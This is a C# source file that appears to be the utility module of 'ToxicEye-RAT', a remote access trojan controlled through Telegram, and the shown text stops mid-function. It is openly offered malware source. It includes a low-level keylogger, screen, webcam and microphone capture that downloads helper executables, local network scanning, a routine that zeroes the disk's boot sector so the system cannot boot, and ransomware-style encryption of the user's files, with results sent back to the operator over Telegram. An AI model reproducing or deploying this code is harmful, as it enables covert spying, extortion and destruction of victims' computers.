/* 
       ^ Author    : LimerBoy
       ^ Name      : ToxicEye-RAT
       ^ Github    : https://github.com/LimerBoy

       > This program is distributed for educational purposes only.
*/

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace TelegramRAT
{
    internal static class utils
    {
        public static Thread keyloggerThread = new Thread(startKeylogger);
        public static string loggerPath = Path.GetDirectoryName(config.InstallPath) + "\\keylogs";
        private static string CurrentActiveWindowTitle;

        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        // Import dll'ls
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        private static int WHKEYBOARDLL = 13;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        public static extern int SendARP(int destIp, int srcIP, byte[] macAddr, ref uint physicalAddrLen);

        [DllImport("user32.dll", EntryPoint = "SendMessage", SetLastError = true)]
        private static extern IntPtr SendMessageW(IntPtr hWnd, Int32 Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("Winmm.dll", SetLastError = true)]
        static extern int mciSendString(string lpszCommand, [MarshalAs(UnmanagedType.LPStr)] StringBuilder lpszReturnString, int cchReturn, IntPtr hwndCallback);

        //https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        //https://msdn.microsoft.com/en-us/library/windows/desktop/aa365747(v=vs.85).aspx
        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        // Is admin
        public static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        // Copy Directory
        public static void CopyFolder(string sourceFolder, string destFolder)
        {
            if (!Directory.Exists(destFolder))
                Directory.CreateDirectory(destFolder);
            string[] files = Directory.GetFiles(sourceFolder);
            foreach (string file in files)
            {
                string name = Path.GetFileName(file);
                string dest = Path.Combine(destFolder, name);
                File.Copy(file, dest);
            }
            string[] folders = Directory.GetDirectories(sourceFolder);
            foreach (string folder in folders)
            {
                string name = Path.GetFileName(folder);
                string dest = Path.Combine(destFolder, name);
                CopyFolder(folder, dest);
            }
        }

        // Get CPU name
        public static string GetCPUName()
        {
            try
            {
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
                foreach (ManagementObject mObject in mSearcher.Get())
                {
                    return mObject["Name"].ToString();
                }
                return "Unknown";
            }
            catch { return "Unknown"; }
        }

        // Get GPU name
        public static string GetGPUName()
        {
            try
            {
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                foreach (ManagementObject mObject in mSearcher.Get())
                {
                    return mObject["Name"].ToString();
                }
                return "Unknown";
            }
            catch { return "Unknown"; }
        }

        // Get RAM
        public static int GetRamAmount()
        {
            try
            {
                int RamAmount = 0;
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    foreach (ManagementObject MO in MOS.Get())
                    {
                        double Bytes = Convert.ToDouble(MO["TotalPhysicalMemory"]);
                        RamAmount = (int)(Bytes / 1048576);
                        break;
                    }
                }
                return RamAmount;
            }
            catch
            {
                return -1;
            }
        }

        // Get HWID
        public static string GetHWID()
        {
            try
            {
                using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor")) {
                    foreach (ManagementObject mObject in mSearcher.Get())
                    {
                        return mObject["ProcessorId"].ToString();
                    }
                }
                return "Unknown";
            }
            catch { return "Unknown"; }
        }

        // Get system version
        private static string GetWindowsVersionName()
        {
            using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem")) {
                string sData = string.Empty;
                foreach (ManagementObject tObj in mSearcher.Get())
                {
                    sData = Convert.ToString(tObj["Name"]);
                }
                try {
                    sData = sData.Split(new char[] { '|' })[0];
                    int iLen = sData.Split(new char[] { ' ' })[0].Length;
                    sData = sData.Substring(iLen).TrimStart().TrimEnd();
                }
                catch { sData = "Unknown System"; }
                return sData;
            }
        }

        // Get bit
        private static string getBitVersion()
        {
            if (Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0").GetValue("Identifier").ToString().Contains("x86"))
            {
                return "(32 Bit)";
            }
            else
            {
                return "(64 Bit)";
            }
        }

        // Get system version
        public static string GetSystemVersion()
        {
            return (GetWindowsVersionName() + Convert.ToChar(0x20) + getBitVersion());
        }

        // Get programs list
        public static string GetProgramsList()
        {
            List<string> programs = new List<string>();

            foreach (string program in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)))
            {
                programs.Add(new DirectoryInfo(program).Name);
            }
            foreach (string program in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles)))
            {
                programs.Add(new DirectoryInfo(program).Name);
            }

            return string.Join(", ", programs) + ".";

        }


        // Get default gateway
        public static IPAddress GetDefaultGateway()
        {
            return NetworkInterface
                .GetAllNetworkInterfaces()
                .Where(n => n.OperationalStatus == OperationalStatus.Up)
                .Where(n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                .SelectMany(n => n.GetIPProperties()?.GatewayAddresses)
                .Select(g => g?.Address)
                .Where(a => a != null)
                .FirstOrDefault();
        }

        // Is connected to internet
        public static void isConnectedToInternet()
        {
            // Check if connected to internet
            while (true)
            {
                Ping ping = new Ping();
                PingReply reply;
                try
                {
                    reply = ping.Send("google.com", 600);
                } catch { continue; }
                // Status
                if (reply.Status == IPStatus.Success)
                {
                    Console.WriteLine("[+] Connected to internet");
                    // Check if can connect to api.telegram.org
                    while (true)
                    {
                        try
                        {
                            reply = ping.Send("api.telegram.org", 600);
                        }
                        catch { continue; }
                        // Status
                        if (reply.Status == IPStatus.Success)
                        {
                            Console.WriteLine("[+] Connected to api.telegram.org");
                            break;
                        }
                        else
                        {
                            Console.WriteLine("[!] Retrying connect to api.telegram.org");
                            continue;
                        }
                    }
                    break;
                }
                else {
                    Console.WriteLine("[!] Retrying connect to internet...");
                    continue;
                }
            }
        }

        // Scan wlan
        public static void NetDiscover(int to)
        {
            telegram.sendText($"📡 Scanning local network. From 1 to {to} hosts.");
            string gateway = "";
            try { gateway = GetDefaultGateway().ToString(); }
            catch (NullReferenceException)
            {
                telegram.sendText("🔌 Not connected to WI-FI network.");
                return;
            }
            byte[] macAddr = new byte[6];
            uint macAddrLen = (uint)macAddr.Length;
            string ip, host, mac;
            string[] s = gateway.Split('.');
            string target = s[0] + "." + s[1] + "." + s[2] + ".";
            for (int i = 1; i < to; i++)
            {

                ip = target + i.ToString();
                Ping ping = new Ping();
                PingReply reply = ping.Send(ip, 10);

                if (reply.Status == IPStatus.Success)
                {
                    IPAddress addr = IPAddress.Parse(ip);
                    // Get hostname
                    try
                    {
                        host = Dns.GetHostEntry(addr).HostName;
                    }
                    catch { host = "unknown"; }
                    // Get mac
                    if (SendARP(BitConverter.ToInt32(IPAddress.Parse(ip).GetAddressBytes(), 0), 0, macAddr, ref macAddrLen) != 0)
                    { mac = "unknown"; }
                    else
                    {
                        string[] v = new string[(int)macAddrLen];
                        for (int j = 0; j < macAddrLen; j++)
                            v[j] = macAddr[j].ToString("x2");
                        mac = string.Join(":", v);
                    }
                    telegram.sendText(string.Format("✅ New host detected. Ip: \"{0}\", Name: \"{1}\", Mac: \"{2}\"", ip, host, mac));
                }
            }
            telegram.sendText("✅ Scanning " + to + " hosts completed!");
        }

        // Desktop screenshot
        public static void desktopScreenshot()
        {
            string filename = "screenshot.png";
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            bmpScreenshot.Save(filename, System.Drawing.Imaging.ImageFormat.Png);
            // Send
            telegram.sendImage(filename);
            // Delete photo
            File.Delete(filename);
        }

        // Webcam screenshot
        public static void webcamScreenshot(string delay, string camera)
        {
            // Links
            string commandCamPATH = Environment.GetEnvironmentVariable("temp") + "\\CommandCam.exe";
            string commandCamLINK = "https://raw.githubusercontent.com/tedburke/CommandCam/master/CommandCam.exe";
            string filename = "webcam.png";
            // Check if CommandCam.exe file exists
            if (!File.Exists(commandCamPATH))
            {
                telegram.sendText("📷 Downloading CommandCam...");
                WebClient webClient = new WebClient();
                webClient.DownloadFile(commandCamLINK, commandCamPATH);
                telegram.sendText("📷 CommandCam loaded!");
            }
            // Log
            telegram.sendText($"📹 Trying create screenshot from camera {camera}");
            // Check if file exists
            if (File.Exists(filename))
            {
                File.Delete(filename);
            }
            // Create screenshot
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = commandCamPATH;
            startInfo.Arguments = $"/filename \"{filename}\" /delay {delay} /devnum {camera}";
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
            // Check if photo exists
            if (!File.Exists(filename))
            {
                telegram.sendText("📷 Webcam not found!");
                return;
            }
            // Send
            telegram.sendImage(filename);
            // Delete photo
            File.Delete(filename);
        }

        // Record microphone
        public static void recordMircophone(string time)
        {
            string fmediaFILE = "fmedia.exe";
            string fmediaPATH = Environment.GetEnvironmentVariable("temp") + "\\fmedia\\";
            string fmediaLINK = "https://raw.githubusercontent.com/LimerBoy/hackpy/master/modules/audio.zip";
            string filename = "recording.wav";
            // Log
            telegram.sendText($"🎧 Listening microphone {time} seconds...");
            // Check if fmedia.exe file exists
            if (!File.Exists(fmediaPATH + fmediaFILE))
            {
                telegram.sendText("🎤 Downloading FMedia...");
                string tempArchive = fmediaPATH + "fmedia.zip";
                Directory.CreateDirectory(fmediaPATH);
                WebClient webClient = new WebClient();
                webClient.DownloadFile(fmediaLINK, tempArchive);
                System.IO.Compression.ZipFile.ExtractToDirectory(tempArchive, fmediaPATH);
                File.Delete(tempArchive);
                telegram.sendText("🎤 FMedia loaded!");
            }
            // Check if file exists
            if (File.Exists(filename))
            {
                File.Delete(filename);
            }

            // Record audio
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = fmediaPATH + fmediaFILE;
            startInfo.Arguments = $"--record --until={time} -o {filename}";
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
            // Check if recording exists
            if (!File.Exists(filename))
            {
                telegram.sendText("🎤 Microphone not found!");
                return;
            }
            // Send
            telegram.sendVoice(filename);
            // Delete recording
            File.Delete(filename);
        }

        // Power command
        public static void PowerCommand(string args)
        {
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = "shutdown.exe";
            startInfo.Arguments = args;
            process.StartInfo = startInfo;
            process.Start();
        }

        // Keylogger
        public static void startKeylogger()
        {
            // Delete logs if exists
            if (File.Exists(loggerPath))
            { File.Delete(loggerPath); }
            _hookID = SetHook(_proc);
            Application.Run();
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                bool capsLock = (GetKeyState(0x14) & 0xffff) != 0;
                bool shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
                string currentKey = KeyboardLayout((uint)vkCode);

                if (capsLock || shiftPress)
                {
                    currentKey = currentKey.ToUpper();
                }
                else
                {
                    currentKey = currentKey.ToLower();
                }

                if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                    currentKey = "[" + (Keys)vkCode + "]";

                else
                {
                    switch (((Keys)vkCode).ToString())
                    {
                        case "Space":
                            currentKey = " ";
                            break;
                        case "Return":
                            currentKey = "\n";
                            break;
                        case "Escape":
                            currentKey = "[ESC]";
                            break;
                        case "LControlKey":
                            currentKey = "[CTRL]";
                            break;
                        case "RControlKey":
                            currentKey = "[CTRL]";
                            break;
                        case "RShiftKey":
                            currentKey = "[RShift]";
                            break;
                        case "LShiftKey":
                            currentKey = "[LShift]";
                            break;
                        case "Back":
                            currentKey = "[Back]";
                            break;
                        case "LWin":
                            currentKey = "[WIN]";
                            break;
                        case "Tab":
                            currentKey = "[Tab]";
                            break;
                        case "Capital":
                            if (capsLock == true)
                                currentKey = "[CAPSLOCK: OFF]";
                            else
                                currentKey = "[CAPSLOCK: ON]";
                            break;
                    }
                }

                using (StreamWriter sw = new StreamWriter(loggerPath, true))
                {
                    if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                    {
                        sw.Write(currentKey);
                    }
                    else
                    {
                        sw.WriteLine(Environment.NewLine);
                        sw.WriteLine($"###  {GetActiveWindowTitle()} ###");
                        sw.Write(currentKey);
                    }
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        //
        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                byte[] vkBuffer = new byte[256];
                if (!GetKeyboardState(vkBuffer)) return "";
                uint scanCode = MapVirtualKey(vkCode, 0);
                IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out uint processId));
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
                return sb.ToString();
            }
            catch { }
            return ((Keys)vkCode).ToString();
        }

        // Get active window
        public static string GetActiveWindowTitle()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();
                GetWindowThreadProcessId(hwnd, out uint pid);
                Process p = Process.GetProcessById((int)pid);
                string title = p.MainWindowTitle;
                if (string.IsNullOrWhiteSpace(title))
                    title = p.ProcessName;
                CurrentActiveWindowTitle = title;
                return title;
            }
            catch (Exception)
            {
                return "Unknown";
            }
        }

        // Max win
        public static void MinimizeAllWindows()
        {
            IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
            SendMessageW(lHwnd, 0x111, (IntPtr)419, IntPtr.Zero);

        }

        public static void MaximizeAllWindows()
        {
            IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
            SendMessageW(lHwnd, 0x111, (IntPtr)416, IntPtr.Zero);
        }


        // MD5
        public static string MD5(this string s)
        {
            using (var provider = System.Security.Cryptography.MD5.Create())
            {
                StringBuilder builder = new StringBuilder();

                foreach (byte b in provider.ComputeHash(Encoding.UTF8.GetBytes(s)))
                    builder.Append(b.ToString("x2").ToLower());

                return builder.ToString();
            }
        }

        // Play .mp3
        public static void PlayMusic(string file)
        {
            telegram.sendText("🎵 Starting playing " + Path.GetFileName(file));
            try
            {
                StringBuilder sb = new StringBuilder();
                int nRet = mciSendString("open \"" + file + "\" alias MP3", sb, 0, IntPtr.Zero);
                nRet = mciSendString("play MP3", sb, 0, IntPtr.Zero);
            } catch
            {
                telegram.sendText("⛔ Something was wrong while playing " + file);
                return;
            }
        }

        // Overwrite MBR (destroy system)
        public static void DestroySystem()
        {
            uint GenericAll = 0x10000000;
            //dwShareMode
            uint FileShareRead = 0x1;
            uint FileShareWrite = 0x2;
            //dwCreationDisposition
            uint OpenExisting = 0x3;
            //dwFlagsAndAttributes
            uint MbrSize = 512u;

            var mbrData = new byte[MbrSize];

            var mbr = CreateFile(
                "\\\\.\\PhysicalDrive0",
                GenericAll,
                FileShareRead | FileShareWrite,
                IntPtr.Zero,
                OpenExisting, 0, IntPtr.Zero);

            if (mbr == (IntPtr)(-0x1))
            {
                telegram.sendText("⛔ Please start as admin!");
                return;
            }

            if (WriteFile(
                mbr,
                mbrData,
                MbrSize,
                out uint lpNumberOfBytesWritten,
                IntPtr.Zero))
            {
                telegram.sendText("😹 The boot sector has been overwritten. The system will no longer boot.");
                return;
            }
            else
            {
                telegram.sendText("😿 Failed overwrite boot sector.");
                return;
            }
        }


        // Rotate displays
        public class Display
        {
            internal class NativeMethods
            {
                [DllImport("user32.dll")]
                internal static extern DISP_CHANGE ChangeDisplaySettingsEx(
                    string lpszDeviceName, ref DEVMODE lpDevMode, IntPtr hwnd,
                    DisplaySettingsFlags dwflags, IntPtr lParam);

                [DllImport("user32.dll")]
                internal static extern bool EnumDisplayDevices(
                    string lpDevice, uint iDevNum, ref DISPLAY_DEVICE lpDisplayDevice,
                    uint dwFlags);

                [DllImport("user32.dll", CharSet = CharSet.Ansi)]
                internal static extern int EnumDisplaySettings(
                    string lpszDeviceName, int iModeNum, ref DEVMODE lpDevMode);

                public const int DMDO_DEFAULT = 0;
                public const int DMDO_90 = 1;
                public const int DMDO_180 = 2;
                public const int DMDO_270 = 3;

                public const int ENUM_CURRENT_SETTINGS = -1;

            }
            private static bool RotateScreen(uint DisplayNumber, Orientations Orientation)
            {
                if (DisplayNumber == 0)
                    throw new ArgumentOutOfRangeException("DisplayNumber", DisplayNumber, "First display is 1.");

                bool result = false;
                DISPLAY_DEVICE d = new DISPLAY_DEVICE();
                DEVMODE dm = new DEVMODE();
                d.cb = Marshal.SizeOf(d);

                if (!NativeMethods.EnumDisplayDevices(null, DisplayNumber - 1, ref d, 0))
                    throw new ArgumentOutOfRangeException("DisplayNumber", DisplayNumber, "Number is greater than connected displays.");

                if (0 != NativeMethods.EnumDisplaySettings(
                    d.DeviceName, NativeMethods.ENUM_CURRENT_SETTINGS, ref dm))
                {
                    if ((dm.dmDisplayOrientation + (int)Orientation) % 2 == 1) // Need to swap height and width?
                    {
                        int temp = dm.dmPelsHeight;
                        dm.dmPelsHeight = dm.dmPelsWidth;
                        dm.dmPelsWidth = temp;
                    }

                    switch (Orientation)
                    {
                        case Orientations.DEGREES_CW_90:
                            dm.dmDisplayOrientation = NativeMethods.DMDO_270;
                            break;
                        case Orientations.DEGREES_CW_180:
                            dm.dmDisplayOrientation = NativeMethods.DMDO_180;
                            break;
                        case Orientations.DEGREES_CW_270:
                            dm.dmDisplayOrientation = NativeMethods.DMDO_90;
                            break;
                        case Orientations.DEGREES_CW_0:
                            dm.dmDisplayOrientation = NativeMethods.DMDO_DEFAULT;
                            break;
                        default:
                            break;
                    }

                    DISP_CHANGE ret = NativeMethods.ChangeDisplaySettingsEx(
                    d.DeviceName, ref dm, IntPtr.Zero,
                    DisplaySettingsFlags.CDS_UPDATEREGISTRY, IntPtr.Zero);

                    result = ret == 0;
                }

                return result;
            }
            public static void Rotate(string degrees)
            {
                try
                {
                    uint i = 0;
                    while (++i <= 64)
                    {
                        // 0 - 0, 3 - 90, 2 - 180, 1 - 270.
                        switch (degrees)
                        {
                            case "0":
                                {
                                    RotateScreen(i, 0);
                                    break;
                                }
                            case "90":
                                {
                                    RotateScreen(i, Orientations.DEGREES_CW_90);
                                    break;
                                }
                            case "180":
                                {
                                    RotateScreen(i, Orientations.DEGREES_CW_180);
                                    break;
                                }
                            case "270":
                                {
                                    RotateScreen(i, Orientations.DEGREES_CW_270);
                                    break;
                                }
                            default:
                                {
                                    return;
                                }
                        }
                        return;
                    }
                }
                catch (Exception)
                {
                    // Everything is fine, just reached the last display
                }
            }

            private enum Orientations
            {
                DEGREES_CW_0 = 0,
                DEGREES_CW_90 = 3,
                DEGREES_CW_180 = 2,
                DEGREES_CW_270 = 1
            }

            [StructLayout(LayoutKind.Explicit, CharSet = CharSet.Ansi)]
            internal struct DEVMODE
            {
                public const int CCHDEVICENAME = 32;
                public const int CCHFORMNAME = 32;

                [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCHDEVICENAME)]
                [FieldOffset(0)]
                public string dmDeviceName;
                [FieldOffset(32)]
                public Int16 dmSpecVersion;
                [FieldOffset(34)]
                public Int16 dmDriverVersion;
                [FieldOffset(36)]
                public Int16 dmSize;
                [FieldOffset(38)]
                public Int16 dmDriverExtra;
                [FieldOffset(40)]
                public DM dmFields;

                [FieldOffset(44)]
                Int16 dmOrientation;
                [FieldOffset(46)]
                Int16 dmPaperSize;
                [FieldOffset(48)]
                Int16 dmPaperLength;
                [FieldOffset(50)]
                Int16 dmPaperWidth;
                [FieldOffset(52)]
                Int16 dmScale;
                [FieldOffset(54)]
                Int16 dmCopies;
                [FieldOffset(56)]
                Int16 dmDefaultSource;
                [FieldOffset(58)]
                Int16 dmPrintQuality;

                [FieldOffset(44)]
                public POINTL dmPosition;
                [FieldOffset(52)]
                public Int32 dmDisplayOrientation;
                [FieldOffset(56)]
                public Int32 dmDisplayFixedOutput;

                [FieldOffset(60)]
                public short dmColor;
                [FieldOffset(62)]
                public short dmDuplex;
                [FieldOffset(64)]
                public short dmYResolution;
                [FieldOffset(66)]
                public short dmTTOption;
                [FieldOffset(68)]
                public short dmCollate;
                [FieldOffset(72)]
                [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCHFORMNAME)]
                public string dmFormName;
                [FieldOffset(102)]
                public Int16 dmLogPixels;
                [FieldOffset(104)]
                public Int32 dmBitsPerPel;
                [FieldOffset(108)]
                public Int32 dmPelsWidth;
                [FieldOffset(112)]
                public Int32 dmPelsHeight;
                [FieldOffset(116)]
                public Int32 dmDisplayFlags;
                [FieldOffset(116)]
                public Int32 dmNup;
                [FieldOffset(120)]
                public Int32 dmDisplayFrequency;
            }

            // See: https://msdn.microsoft.com/en-us/library/windows/desktop/dd183569(v=vs.85).aspx
            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
            internal struct DISPLAY_DEVICE
            {
                [MarshalAs(UnmanagedType.U4)]
                public int cb;
                [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
                public string DeviceName;
                [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
                public string DeviceString;
                [MarshalAs(UnmanagedType.U4)]
                public DisplayDeviceStateFlags StateFlags;
                [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
                public string DeviceID;
                [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
                public string DeviceKey;
            }

            // See: https://msdn.microsoft.com/de-de/library/windows/desktop/dd162807(v=vs.85).aspx
            [StructLayout(LayoutKind.Sequential)]
            internal struct POINTL
            {
                long x;
                long y;
            }

            internal enum DISP_CHANGE : int
            {
                Successful = 0,
                Restart = 1,
                Failed = -1,
                BadMode = -2,
                NotUpdated = -3,
                BadFlags = -4,
                BadParam = -5,
                BadDualView = -6
            }

            // http://www.pinvoke.net/default.aspx/Enums/DisplayDeviceStateFlags.html
            [Flags()]
            internal enum DisplayDeviceStateFlags : int
            {
                /// <summary>The device is part of the desktop.</summary>
                AttachedToDesktop = 0x1,
                MultiDriver = 0x2,
                /// <summary>The device is part of the desktop.</summary>
                PrimaryDevice = 0x4,
                /// <summary>Represents a pseudo device used to mirror application drawing for remoting or other purposes.</summary>
                MirroringDriver = 0x8,
                /// <summary>The device is VGA compatible.</summary>
                VGACompatible = 0x10,
                /// <summary>The device is removable; it cannot be the primary display.</summary>
                Removable = 0x20,
                /// <summary>The device has more display modes than its output devices support.</summary>
                ModesPruned = 0x8000000,
                Remote = 0x4000000,
                Disconnect = 0x2000000
            }

            // http://www.pinvoke.net/default.aspx/user32/ChangeDisplaySettingsFlags.html
            [Flags()]
            internal enum DisplaySettingsFlags : int
            {
                CDS_NONE = 0,
                CDS_UPDATEREGISTRY = 0x00000001,
                CDS_TEST = 0x00000002,
                CDS_FULLSCREEN = 0x00000004,
                CDS_GLOBAL = 0x00000008,
                CDS_SET_PRIMARY = 0x00000010,
                CDS_VIDEOPARAMETERS = 0x00000020,
                CDS_ENABLE_UNSAFE_MODES = 0x00000100,
                CDS_DISABLE_UNSAFE_MODES = 0x00000200,
                CDS_RESET = 0x40000000,
                CDS_RESET_EX = 0x20000000,
                CDS_NORESET = 0x10000000
            }

            [Flags()]
            internal enum DM : int
            {
                Orientation = 0x00000001,
                PaperSize = 0x00000002,
                PaperLength = 0x00000004,
                PaperWidth = 0x00000008,
                Scale = 0x00000010,
                Position = 0x00000020,
                NUP = 0x00000040,
                DisplayOrientation = 0x00000080,
                Copies = 0x00000100,
                DefaultSource = 0x00000200,
                PrintQuality = 0x00000400,
                Color = 0x00000800,
                Duplex = 0x00001000,
                YResolution = 0x00002000,
                TTOption = 0x00004000,
                Collate = 0x00008000,
                FormName = 0x00010000,
                LogPixels = 0x00020000,
                BitsPerPixel = 0x00040000,
                PelsWidth = 0x00080000,
                PelsHeight = 0x00100000,
                DisplayFlags = 0x00200000,
                DisplayFrequency = 0x00400000,
                ICMMethod = 0x00800000,
                ICMIntent = 0x01000000,
                MediaType = 0x02000000,
                DitherType = 0x04000000,
                PanningWidth = 0x08000000,
                PanningHeight = 0x10000000,
                DisplayFixedOutput = 0x20000000
            }
        }

        public static IEnumerable<string> GetFiles(string path, string searchPattern, SearchOption searchOption)
        {
            var foldersToProcess = new List<string>()
            {
                path
            };

            while (foldersToProcess.Count > 0)
            {
                string folder = foldersToProcess[0];
                foldersToProcess.RemoveAt(0);

                if (searchOption.HasFlag(SearchOption.AllDirectories))
                {
                    //get subfolders
                    try
                    {
                        var subfolders = Directory.GetDirectories(folder);
                        foldersToProcess.AddRange(subfolders);
                    }
                    catch 
                    {
                        //log if you're interested
                    }
                }

                //get files
                var files = new List<string>();
                try
                {
                    files = Directory.GetFiles(folder, searchPattern, SearchOption.TopDirectoryOnly).ToList();
                }
                catch 
                {
                    //log if you're interested
                }

                foreach (var file in files)
                {
                    yield return file;
                }
            }
        }

        // Encrypt file system
        public static void EncryptFileSystem(string key)
        {
            // Find
            string encryptDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var files = GetFiles(encryptDir, "*.*", SearchOption.AllDirectories);
            List<string> encFiles = new List<string>{ };
            foreach (string file in files)
            {
                if(config.EncryptionFileTypes.Contains(Path.GetExtension(file)))
                    encFiles.Add(Path.GetFullPath(file));
            }
            telegram.sendText($"🔒 {encFiles.Count} files will be encrypted");
            // Encrypt
            foreach (string file in encFiles)
            {
                EncryptFile(file, key);
            }
            telegram.sendText("🔒 All files encrypted in user directory");
        }

        // Decrypt file system
        public static void DecryptFileSystem(string key)
        {
            // Find
            string encryptDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var files = GetFiles(encryptDir, "*.crypted", SearchOption.AllDirectories);
            telegram.sendText($"🔓 {files.Count()} files will be decrypted");
            // Decrypt
            foreach (string file in files)
            {
                DecryptFile(file, key);
            }
            telegram.sendText("🔓 All files decrypted in user directory");
        }

        // Encrypt string
        private static byte[] EncryptBytes(byte[] clearBytes, string EncryptionKey)
        {
            using (Aes encryptor = Aes.Create())
            {
